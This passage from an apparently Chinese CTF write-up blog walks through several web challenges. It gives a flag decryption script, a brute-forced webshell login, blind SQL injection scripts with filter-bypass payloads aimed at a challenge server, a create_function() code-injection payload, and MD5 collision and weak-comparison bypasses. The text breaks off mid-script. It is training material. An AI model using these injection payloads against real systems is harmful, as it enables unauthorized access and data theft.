$i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= $key &#123;$x&#125;;</span><br><span class="line">$x ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line">$str .= chr ( ord ( $data &#123;$i&#125; ) + (ord ( $char &#123;$i&#125; )) % <span class="number">256</span> );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> base64_encode ( $str );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span><span class="params">($data, $key)</span> </span>&#123;</span><br><span class="line">$key = md5 ( $key );</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">$data = base64_decode ( $data );</span><br><span class="line">$len = strlen ( $data );</span><br><span class="line">$l = strlen ( $key );</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> ($x == $l) &#123;</span><br><span class="line">$x = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">$char .= substr ( $key, $x, <span class="number">1</span> );</span><br><span class="line">$x ++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">0</span>; $i &lt; $len; $i ++) &#123;</span><br><span class="line"><span class="keyword">if</span> (ord ( substr ( $data, $i, <span class="number">1</span> ) ) &lt; ord ( substr ( $char, $i, <span class="number">1</span> ) )) &#123;</span><br><span class="line">$str .= chr ( (ord ( substr ( $data, $i, <span class="number">1</span> ) ) + <span class="number">256</span>) - ord ( substr ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">$str .= chr ( ord ( substr ( $data, $i, <span class="number">1</span> ) ) - ord ( substr ( $char, $i, <span class="number">1</span> ) ) );</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> $str;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key=<span class="string">"MyCTF"</span>;</span><br><span class="line">$flag=<span class="string">"o6lziae0xtaqoqCtmWqcaZuZfrd5pbI="</span>;<span class="comment">//encrypt($flag,$key);</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//添加下面的语句即可</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> decrypt($flag,$key);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webxiazai_2.PNG" alt></p><h2 id="该网站已被黑"><a href="#该网站已被黑" class="headerlink" title="该网站已被黑"></a>该网站已被黑</h2><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webshell_1.PNG" alt></p><p>御剑扫描一波</p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webshell_2.PNG" alt></p><p>登入shell.php</p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webshell_3.PNG" alt></p><p>可以使用burp暴力破解，密码为<strong>hack</strong></p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webshell_4.PNG" alt></p><h2 id="曲折的人生"><a href="#曲折的人生" class="headerlink" title="曲折的人生"></a>曲折的人生</h2><p>看到一个登陆页面，随便输入</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webquzherensheng_1.PNG" alt></p><p>有返回报错信息，可以构造or语句，获取登陆密码和用户名</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from `admin` where username=&apos;admin&apos;用户名:admin不正确</span><br></pre></td></tr></table></figure><p>构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select id,username,password from `admin` where username=&apos;&apos; or ascii(substr((select password from `admin` limit 0,1),1,1))&gt;1 # &apos;&apos;</span><br></pre></td></tr></table></figure><p>写个脚本Fuzz一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.79.1.69:10005/index.php?check'</span></span><br><span class="line"></span><br><span class="line">uname_list = [<span class="string">' '</span>, <span class="string">'select'</span>, <span class="string">'or'</span>, <span class="string">'and'</span>, <span class="string">'union'</span>, <span class="string">'\''</span>, <span class="string">'from'</span>, <span class="string">'\\'</span>, <span class="string">'#'</span>, <span class="string">'--'</span>, <span class="string">'+'</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> uname_list:</span><br><span class="line">data = &#123;<span class="string">'username'</span>:i&#125;</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line">soup = BeautifulSoup(result.text,<span class="string">'lxml'</span>)</span><br><span class="line">links = soup.find_all(<span class="string">'div'</span>, class_=<span class="string">'tip'</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> links:</span><br><span class="line">print(i + <span class="string">" 结果 "</span> + j.get_text())</span><br><span class="line">print(<span class="string">'************************************'</span>)</span><br></pre></td></tr></table></figure><p>可以知道，空格，select，or，union被过滤，但是可以采取重写方式绕过，空格采取/**/方式绕过</p><p>注入脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.79.1.69:10005/index.php?check'</span></span><br><span class="line">password = []</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#s = "'/**/oorr/**/length((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1))=3/**/#'"</span></span><br><span class="line"><span class="comment">#判断长度</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">100</span>):</span><br><span class="line">s = <span class="string">"'/**/oorr/**/length((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1))="</span>+str(i)+<span class="string">"/**/#'"</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:s&#125;</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">'goodboy'</span> <span class="keyword">in</span> result.text):</span><br><span class="line">print(i)</span><br><span class="line">length_pass = i</span><br><span class="line">soup = BeautifulSoup(result.text,<span class="string">'lxml'</span>)</span><br><span class="line">links = soup.find_all(<span class="string">'div'</span>, class_=<span class="string">'tip'</span>)</span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> links:</span><br><span class="line">print(<span class="string">" 结果 "</span> + x.get_text())</span><br><span class="line">print(<span class="string">'************************************'</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#s = "'/**/oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),1,1))&gt;1/**/#'"</span></span><br><span class="line"><span class="comment">#判断内容</span></span><br><span class="line">l = <span class="number">1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,length_pass+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">s = <span class="string">"'/**/oorr/**/ascii(substr((seselectlect/**/passwoorrd/**/from/**/`admin`/**/limit/**/0,1),"</span>+str(i)+<span class="string">",1))"</span>+<span class="string">"="</span>+str(j)+<span class="string">"/**/#'"</span></span><br><span class="line">data = &#123;<span class="string">'username'</span>:s&#125;</span><br><span class="line">result = requests.post(url=url, data=data)</span><br><span class="line"><span class="keyword">if</span>(<span class="string">'goodboy'</span> <span class="keyword">in</span> result.text):</span><br><span class="line">print(<span class="string">"第"</span> + str(l) + <span class="string">"次"</span>)</span><br><span class="line">l = l + <span class="number">1</span></span><br><span class="line">password.append(chr(int(j)))</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">''</span>.join(password))</span><br><span class="line"><span class="comment">#ajahas&amp;&amp;*44askldajaj</span></span><br><span class="line"><span class="comment">#goodboy_g-60Hellowor 这里过滤了or 应输入 goodboy_g-60Hellowoorr</span></span><br></pre></td></tr></table></figure><p>快速计算脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://120.79.1.69:10005/index.php'</span></span><br><span class="line"></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line">r = sess.get(url=url)</span><br><span class="line"></span><br><span class="line">soup = BeautifulSoup(r.text,<span class="string">'lxml'</span>)</span><br><span class="line"></span><br><span class="line">links = soup.find_all(<span class="string">'div'</span>, class_=<span class="string">'rep'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> links:</span><br><span class="line">s = i.get_text()</span><br><span class="line"></span><br><span class="line">s = s.replace(<span class="string">'（'</span>,<span class="string">'('</span>)</span><br><span class="line">s = s.replace(<span class="string">'）'</span>,<span class="string">')'</span>)</span><br><span class="line">s = s.replace(<span class="string">'X'</span>,<span class="string">'*'</span>)</span><br><span class="line">print(s)</span><br><span class="line"></span><br><span class="line">num = eval(s)</span><br><span class="line"></span><br><span class="line">print(num)</span><br><span class="line"></span><br><span class="line">urls = <span class="string">'http://120.79.1.69:10005/index.php?check'</span></span><br><span class="line">password = <span class="string">'ajahas&amp;&amp;*44askldajaj'</span></span><br><span class="line">uname = <span class="string">'goodboy_g-60Hellowoorr'</span></span><br><span class="line"></span><br><span class="line">data = &#123;<span class="string">'username'</span>:uname, <span class="string">'password'</span>:password, <span class="string">'code'</span>:num&#125;</span><br><span class="line"></span><br><span class="line">res = sess.post(url=urls, data=data)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure><p>得到的响应，一个压缩包，也给出了解压密码</p><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webquzherensheng_2.png" alt></p><p>解压之后，有一个加密的flag.zip，Form1.txt给出了解密方法，python脚本破解一下，结果是<code>VmH0wW3DZalBnmmSalV1SYSGRr1r3jVYcFrHWkUUlhljkFzCbXaEKyaVJymT1FlVTVskVWhGtonaGU2WWGhVXYol1WVI1F2odFuk</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">re_string = <span class="string">"VmxSS05HSXhXbkpOV0VwT1YwVmFWRll3Wkc5VVJsbDNWMnhhYkZac1NqQlpNRll3VlRBeFNWRnNjRmRpUmtwSVZsY3hSMk14V2xsalJsSnBVakpvV0ZaR1dsWmxSbHBYWWtSYVZtRjZWbGRVVmxwelRrWmFTR1ZHWkZSaGVrWlhWR3hTVjFZeVJuSlhiRUpYWVRGYVYxcFhlRkprTVZaeVkwZHNVMDFWY0ZkV2JURXdWREZSZUZkcmFGVmlhelZvVlcxNFMxWXhjRlpXVkVaUFlrYzVObGt3VmpCWFJrcHpWbXBTVjFadFVqTldiWE4zWkRKT1IySkdaRmRTVm5CUVZtMTBhMVJyTVVkVmJrcFZZa2RTVDFac1VsZFdNVlY0Vld0a1ZVMXNXbGhXTVdodlZsZEtSMU5yWkZWV1JVVXhWV3hhWVZkSFZraGtSbVJUWWtoQ1JsWnJaRFJWTWtaMFUydG9WbUpHV2xoV01HUnZWVVp3V0UxWGNHeFdhelY2V1ZWYVlWUnNXbkpYYm1oWFlrWktVRlY2Um10U01WcFpZVVpXVjJKRmNIaFdSM1JXVFZVd2QyTkdWbFZoTVZwTVZtdFZNVkpuSlRORUpUTkU="</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_password</span><span class="params">(s)</span>:</span></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line">k = <span class="string">''</span></span><br><span class="line"><span class="keyword">while</span>(i &lt;= len(s)):</span><br><span class="line">k = k + s[i<span class="number">-1</span>:i]</span><br><span class="line">i = i + (i%<span class="number">5</span>)</span><br><span class="line"><span class="keyword">return</span> k</span><br><span class="line"></span><br><span class="line">password = get_password(re_string)</span><br><span class="line">print(get_password(password))</span><br></pre></td></tr></table></figure><blockquote><p>快速计算的那个也可以用正则表达式，这里用的是beautifulsoup解析，根据他class=rep这个唯一特征。</p></blockquote><h2 id="not-easy"><a href="#not-easy" class="headerlink" title="not easy"></a>not easy</h2><p>代码审计的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>])) &#123;</span><br><span class="line">    $action = $_GET[<span class="string">'action'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'action'</span>]))&#123;</span><br><span class="line">    $arg = $_GET[<span class="string">'arg'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">'/^[a-z0-9_]*$/isD'</span>, $action))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $action($arg,<span class="string">''</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这一题是create_function()注入。正则表达式中<strong>/i</strong>不区分大小写，<strong>/s</strong>匹配任何不可见字符，<strong>/D</strong>如果使用$限制结尾字符，则不允许结尾有换行。相当于在不允许使用数字字母下划线的情况下，调用函数。</p><p>这里使用的绕过方案是在函数前面加一个 \ ，P神在小密圈的解释</p><blockquote><p>php里默认命名空间是 \，所有原生函数和类都在这个命名空间中。普通调用一个函数，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。 如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</p></blockquote><p>对于create_function()，官方给的解释如下图</p><p><img src="https://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webnoteasy_1.png" alt></p><p>以如下代码为例</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$newfunc = create_function(<span class="string">'$a,$b'</span>, <span class="string">'return "ln($a) + ln($b) = " . log($a * $b);'</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"New anonymous function: $newfunc\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> $newfunc(<span class="number">2</span>, M_E) . <span class="string">"\n"</span>;</span><br><span class="line"><span class="comment">// outputs</span></span><br><span class="line"><span class="comment">// New anonymous function: lambda_1</span></span><br><span class="line"><span class="comment">// ln(2) + ln(2.718281828459) = 1.6931471805599</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>第一行代码等价于</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__lambda_func</span><span class="params">($a, $b)</span></span>&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"ln($a) + ln($b) = "</span> . log($a * $b); </span><br><span class="line">&#125;</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>在本题中，构造$action=\create_function，$action($arg,’’); 即为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">lambda_1</span><span class="params">($arg)</span></span>&#123;</span><br><span class="line"><span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>构造$arg=){}print_r(scandir(‘./‘));/*，即可。</p><h2 id="audit"><a href="#audit" class="headerlink" title="audit"></a>audit</h2><p>又是代码审计</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">include(&apos;flag.php&apos;);</span><br><span class="line">$str1 = @$_GET[&apos;str1&apos;];</span><br><span class="line">$str2 = @$_GET[&apos;str2&apos;];</span><br><span class="line">$str3 = @$_GET[&apos;str3&apos;];</span><br><span class="line">$str4 = @$_GET[&apos;str4&apos;];</span><br><span class="line">$str5 = (string)@$_POST[&apos;str5&apos;];</span><br><span class="line">$str6 = (string)@$_POST[&apos;str6&apos;];</span><br><span class="line">$str7 = (string)@$_POST[&apos;str7&apos;];</span><br><span class="line">if( $str1 == $str2 )&#123;</span><br><span class="line">    die(&apos;str1 OR Sstr2 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( md5($str1) != md5($str2) )&#123;</span><br><span class="line">    die(&apos;step 1 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str3 == $str4 )&#123;</span><br><span class="line">    die(&apos;str3 OR str4 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if ( md5($str3) !== md5($str4))&#123;</span><br><span class="line">    die(&apos;step 2 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if( $str5 == $str6 || $str5 == $str7 || $str6 == $str7 )&#123;</span><br><span class="line">    die(&apos;str5 OR str6 OR str7 no no no&apos;);</span><br><span class="line">&#125;</span><br><span class="line">if (md5($str5) !== md5($str6) || md5($str6) !== md5($str7) || md5($str5) !== md5($str7))&#123;</span><br><span class="line">    die(&apos;step 3 fail&apos;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!($_POST[&apos;a&apos;]) and !($_POST[&apos;b&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;come on!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">$a = $_POST[&apos;a&apos;];</span><br><span class="line">$b = $_POST[&apos;b&apos;];</span><br><span class="line">$m = $_GET[&apos;m&apos;];</span><br><span class="line">$n = $_GET[&apos;n&apos;];</span><br><span class="line"></span><br><span class="line">if (!(ctype_upper($a)) || !(is_numeric($b)) || (strlen($b) &gt; 6)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;a OR b fail!&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ((strlen($m) &gt; 4) || (strlen($n) &gt; 4)) </span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;m OR n fail&quot;;</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$str8 = hash(&apos;md5&apos;, $a, false);</span><br><span class="line">$str9 = strtr(hash(&apos;md5&apos;, $b, false), $m, $n);</span><br><span class="line"></span><br><span class="line">echo &quot;&lt;p&gt;str8 : $str8&lt;/p&gt;&quot;;</span><br><span class="line">echo &quot;&lt;p&gt;str9 : $str9&lt;/p&gt;&quot;;</span><br><span class="line"></span><br><span class="line">if (($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6))</span><br><span class="line">&#123;</span><br><span class="line">    echo &quot;You&apos;re great,give you flag:&quot;;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>第一部分</strong></p><ol><li>str1和str2进行md5弱比较，以0e开头的会被识别为科学计数法，结果均为0</li><li>str3和str4进行md5强比较，传入数组绕过</li><li>str5，str6，str7只能进行md5碰撞，需要生成三个md5相同的文件绕过</li></ol><p>参考这篇文章：<a href="https://xz.aliyun.com/t/3161#toc-5" target="_blank" rel="noopener">基于全等的MD5碰撞绕过</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">D:\fastcoll&gt;fastcoll_v1<span class="number">.0</span><span class="number">.0</span><span class="number">.5</span>.exe -o test0.txt test1.txt     <span class="comment">//-o参数代表随机生成两个相同MD5的文件</span></span><br><span class="line">D:\fastcoll&gt;fastcoll_v1<span class="number">.0</span><span class="number">.0</span><span class="number">.5</span>.exe -p test1.txt -o test00.txt test01.txt</span><br><span class="line"><span class="comment">//-p参数代表根据test1.txt文件随机生成两个相同MD5的文件，注意：生成的MD5与test1.txt不同</span></span><br><span class="line">D:\fastcoll&gt;tail.exe -c <span class="number">128</span> test00.txt &gt; a.txt               <span class="comment">//-c 128代表将test00.txt的最后128位写入文件a，这128位正是test1.txt与test00.txt的MD5不同的原因</span></span><br><span class="line">D:\fastcoll&gt;tail.exe -c <span class="number">128</span> test01.txt &gt; b.txt               <span class="comment">//同理</span></span><br><span class="line">D:\fastcoll&gt;type test0.txt a.txt &gt; test10.txt               <span class="comment">//这里表示将test0.txt和a.txt文件的内容合并写入test10.txt</span></span><br><span class="line">D:\fastcoll&gt;type test0.txt b.txt &gt; test11.txt               <span class="comment">//同理写入test11.txt</span></span><br></pre></td></tr></table></figure><p>然后对生成的文件进行URL编码，参考这篇文章：<a href="https://xz.aliyun.com/t/2232#toc-2" target="_blank" rel="noopener">如何用不同的数值构建一样的MD5</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    $fh = fopen($path, <span class="string">"rb"</span>);</span><br><span class="line">    $data = fread($fh, filesize($path));</span><br><span class="line">    fclose($fh);</span><br><span class="line">    <span class="keyword">return</span> $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'test01'</span>. urlencode(readmyfile(<span class="string">"test01.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'test00'</span>. urlencode(readmyfile(<span class="string">"test00.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'test10'</span>. urlencode(readmyfile(<span class="string">"test10.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">'test11'</span>. urlencode(readmyfile(<span class="string">"test11.txt"</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;\r\n"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="http://wcgimages.oss-cn-shenzhen.aliyuncs.com/myctf/jactf_web/jactf_webaudit_1.png" alt></p><p><strong>第二部分</strong></p><ol><li>a是大写字母，b是数字且长度不大于6</li><li>GET得到的m和n的长度不大于4</li><li>str8为a的md5值</li><li>str9为b的md5值中的<strong>字符</strong>m替换为n</li><li>($str8 == $str9) &amp;&amp; !($a === $b) &amp;&amp; (strlen($b) === 6)，b长度必须为6，a不等于6，a的md5和b的md5替换后的值相同</li></ol><p>这里使用0e绕过，a的值很明显为QNKCDZO</p><p>b的值可以利用这个替换，将一些可能的值替换为我们需要的，is_numeric()函数接受16进制，会把16进制认为是数字，写个脚本找出0e开头的十六进制，然后找出有不大于5个字母数的md5</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000</span>,<span class="number">10000</span>):</span><br><span class="line">k = <span class="string">"0x"</span>+str(i)</span><br><span class="line"></span><br><span class="line">md5_n = hashlib.md5(k.encode()).hexdigest()</span><br><span class="line"><span class="keyword">if</span> md5_n[<span class="number">0</span>:<span class="number">2</span>] == <span 